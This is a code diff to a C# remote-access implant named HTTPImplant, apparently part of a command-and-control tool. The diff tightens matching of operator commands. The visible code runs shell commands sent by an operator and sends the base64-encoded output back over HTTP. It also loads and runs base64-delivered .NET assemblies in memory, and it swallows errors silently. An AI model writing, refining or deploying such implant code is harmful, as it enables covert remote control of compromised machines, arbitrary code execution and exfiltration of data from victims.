@@ -51,7 +51,7 @@ namespace HTTPImplant
 
                         lastCommandExecuted = command.command;
 
-                        if (command.Input.Contains("os"))
+                        if (command.Input.Trim().Equals("os", StringComparison.OrdinalIgnoreCase))
                         {
                             ProcessStartInfo processStartInfo = new ProcessStartInfo
                             {
@@ -75,7 +75,7 @@ namespace HTTPImplant
                             string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                             await SendResult(webClient, implantId, command.Operator, outputBase64);
                         }
-                        else if (command.Input.Contains("execute-assembly"))
+                        else if (command.Input.Trim().Equals("execute-assembly", StringComparison.OrdinalIgnoreCase))
                         {
                             byte[] bytes = Convert.FromBase64String(command.File);
                             string output = ExecuteAssembly.Execute(bytes);
@@ -85,7 +85,6 @@ namespace HTTPImplant
                     }
                     catch (Exception e)
                     {
-                        // Handle error scenario
                     }
                 }
             }
